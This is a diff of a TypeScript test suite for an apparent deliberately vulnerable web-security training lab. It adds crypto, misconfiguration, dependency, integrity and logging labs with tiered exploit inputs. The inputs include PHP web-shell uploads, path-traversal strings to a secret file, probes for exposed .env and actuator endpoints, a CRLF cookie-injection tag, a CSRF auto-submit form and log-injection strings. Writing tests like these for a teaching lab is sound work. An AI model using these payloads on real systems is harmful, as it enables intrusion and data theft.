@@ -3,6 +3,8 @@ import type { AddressInfo } from "node:net";
 import { after, before, describe, it } from "node:test";
 import { createApp, resetLabs } from "./app.js";
 import { registerHttpLabs } from "./labs/http.js";
+import { CRYPTO_VAULT } from "./labs/crypto.js";
+import { integrityExploits } from "./labs/integrity.js";
 import { buildJwtExploitTokens } from "./labs/jwt.js";
 import type { LabInput, Level } from "./labs/runner.js";
 import { markupFires } from "./labs/xss.js";
@@ -14,7 +16,7 @@ const FORM = (extra: string) =>
   `<form action="https://bank.example/transfer" method="post">${extra}<input name="to" value="attacker"><input name="amount" value="10000"></form><script>document.forms[0].submit()</script>`;
 const CRLF = '<img src="https://bank.example/set-lang?l=en%0d%0aSet-Cookie:%20session=s-attacker">';
 
-const LAB_IDS = ["sqli", "xss", "cmdi", "path", "csrf", "idor", "auth", "jwt", "ssrf", "upload"] as const;
+const LAB_IDS = ["sqli", "xss", "cmdi", "path", "csrf", "idor", "auth", "jwt", "ssrf", "upload", "crypto", "misconf", "deps", "integrity", "logging"] as const;
 type LabId = (typeof LAB_IDS)[number];
 
 const jwtTokens = buildJwtExploitTokens();
@@ -80,6 +82,31 @@ const exploits: Record<LabId, Record<1 | 2 | 3 | 4, LabInput>> = {
     3: { filename: "photo.jpg", contentType: "image/jpeg", content: "FFD8...<?php system('id'); ?>" },
     4: { filename: "shell.phtml", contentType: "application/x-httpd-php", content: "<?php system('id'); ?>" },
   },
+  crypto: {
+    1: { action: "decrypt", token: CRYPTO_VAULT[1] },
+    2: { action: "decrypt", token: CRYPTO_VAULT[2] },
+    3: { action: "decrypt", token: CRYPTO_VAULT[3] },
+    4: { action: "decrypt", token: CRYPTO_VAULT[4] },
+  },
+  misconf: {
+    1: { path: "/debug" },
+    2: { path: "/debug/" },
+    3: { path: "/actuator/env" },
+    4: { path: "/.env" },
+  },
+  deps: {
+    1: { file: "../../etc/thumbx/secret", engine: "current" },
+    2: { file: "%2e%2e/%2e%2e/etc/thumbx/secret", engine: "current" },
+    3: { file: encodeURIComponent("%2e%2e/%2e%2e/etc/thumbx/secret"), engine: "current" },
+    4: { file: "../../etc/thumbx/secret", engine: "legacy" },
+  },
+  integrity: integrityExploits,
+  logging: {
+    1: { user: "\\nuser=admin action=export", action: "view" },
+    2: { user: "\\ruser=admin action=export", action: "view" },
+    3: { user: '","user":"admin","action":"export","x":"', action: "view" },
+    4: { user: "", action: "view", op: "export" },
+  },
 };
 
 const benign: Record<LabId, LabInput> = {
@@ -93,9 +120,14 @@ const benign: Record<LabId, LabInput> = {
   jwt: { token: jwtTokens.benign },
   ssrf: { url: "https://images.example.com/banner.png" },
   upload: { filename: "avatar.jpg", contentType: "image/jpeg", content: "FFD8 SAFE_IMAGE_DATA" },
+  crypto: { action: "mine", token: "" },
+  misconf: { path: "/" },
+  deps: { file: "logo.png", engine: "current" },
+  integrity: { manifest: '{"name":"app","version":"1","role":"user"}', signature: "" },
+  logging: { user: "", action: "view", op: "" },
 };
 
-function observed(id: LabId, level: Level, body: string): boolean {
+function observed(id: LabId, level: Level, body: string, headers?: Headers): boolean {
   if (id === "sqli") return level === 4 ? body.includes("S3cr3t-Pa55!") : /\badmin\s+\(administrator\)/.test(body);
   if (id === "xss") return markupFires(body);
   if (id === "cmdi") return body.includes("FLAG{c0mmand_1nj3ct10n}");
@@ -105,6 +137,11 @@ function observed(id: LabId, level: Level, body: string): boolean {
   if (id === "auth") return body.includes("管理コンソール / admin");
   if (id === "jwt") return body.includes("[200 OK] /admin");
   if (id === "ssrf") return body.includes("access-key=");
+  if (id === "crypto") return body.split("\n").includes("card=4242424242424242");
+  if (id === "misconf") return body.split("\n").includes("FLAG{m1sc0nf1g}");
+  if (id === "deps") return body.split("\n").includes("FLAG{old_component}");
+  if (id === "integrity") return body.split("\n").includes("FLAG{uns1gn3d_upd4te}");
+  if (id === "logging") return headers?.get("x-export") === "accepted";
   return body.includes("X-Handler: php (uid=www-data");
 }
 
@@ -185,6 +222,25 @@ describe("real HTTP targets", () => {
       const part = multipart(input);
       headers["Content-Type"] = part.contentType;
       body = part.body;
+    } else if (id === "crypto") {
+      path = `/crypto${lv}/open`;
+      headers["Content-Type"] = "application/x-www-form-urlencoded";
+      body = new URLSearchParams({ action: input.action ?? "mine", token: input.token ?? "" }).toString();
+    } else if (id === "misconf") {
+      method = "GET";
+      path = `/misconf${lv}/page?path=${encodeURIComponent(input.path ?? "/")}`;
+    } else if (id === "deps") {
+      path = `/deps${lv}/thumb`;
+      headers["Content-Type"] = "application/x-www-form-urlencoded";
+      body = new URLSearchParams({ file: input.file ?? "", engine: input.engine ?? "" }).toString();
+    } else if (id === "integrity") {
+      path = `/integrity${lv}/apply`;
+      headers["Content-Type"] = "application/x-www-form-urlencoded";
+      body = new URLSearchParams({ manifest: input.manifest ?? "", signature: input.signature ?? "" }).toString();
+    } else if (id === "logging") {
+      path = `/logging${lv}/act`;
+      headers["Content-Type"] = "application/x-www-form-urlencoded";
+      body = new URLSearchParams({ user: input.user ?? "", action: input.action ?? "", op: input.op ?? "" }).toString();
     } else {
       const endpoint = input.endpoint ?? "/api/orders";
       if (endpoint.includes("graphql")) {
@@ -240,7 +296,7 @@ describe("real HTTP targets", () => {
         it(`Lv${lv} exploit is visible in the HTTP response and is not a score payload`, async () => {
           const input = id === "auth" ? await authExploit(lv) : exploits[id][lv];
           const res = await send(id, lv, input);
-          assert.equal(observed(id, lv, res.body), true, res.body);
+          assert.equal(observed(id, lv, res.body, res.headers), true, res.body);
           assert.doesNotMatch(res.body, /"solved"/);
           assert.equal(res.headers.get("content-type")?.includes("json") ?? false, false);
         });
@@ -250,21 +306,21 @@ describe("real HTTP targets", () => {
           it(`Lv${lv} does not show success for the Lv${prev} exploit`, async () => {
             const input = id === "auth" ? exploits.auth[prev] : exploits[id][prev];
             const res = await send(id, lv, input);
-            assert.equal(observed(id, lv, res.body), false, res.body);
+            assert.equal(observed(id, lv, res.body, res.headers), false, res.body);
           });
         }
 
         it(`Lv5 does not show success for the Lv${lv} exploit`, async () => {
           const input = id === "auth" && lv === 4 ? await authExploit(4) : id === "auth" ? exploits.auth[lv] : exploits[id][lv];
           const res = await send(id, 5, input);
-          assert.equal(observed(id, 5, res.body), false, res.body);
+          assert.equal(observed(id, 5, res.body, res.headers), false, res.body);
         });
       }
 
       for (const lv of [1, 2, 3, 4, 5] as const) {
         it(`Lv${lv} benign input is not success`, async () => {
           const res = await send(id, lv, benign[id]);
-          assert.equal(observed(id, lv, res.body), false, res.body);
+          assert.equal(observed(id, lv, res.body, res.headers), false, res.body);
         });
       }
     });
@@ -286,5 +342,11 @@ describe("real HTTP targets", () => {
     const res = await send("xss", 1, exploits.xss[1]);
     assert.match(res.headers.get("content-type") ?? "", /text\/html/);
     assert.match(res.body, /<script>alert\(1\)<\/script>/);
+  });
+
+  it("logging does not treat an echoed flag as success", async () => {
+    const res = await send("logging", 1, { user: "FLAG{l0g_1nj3ct}", action: "view" });
+    assert.equal(res.headers.get("x-export"), null);
+    assert.equal(observed("logging", 1, res.body, res.headers), false);
   });
 });
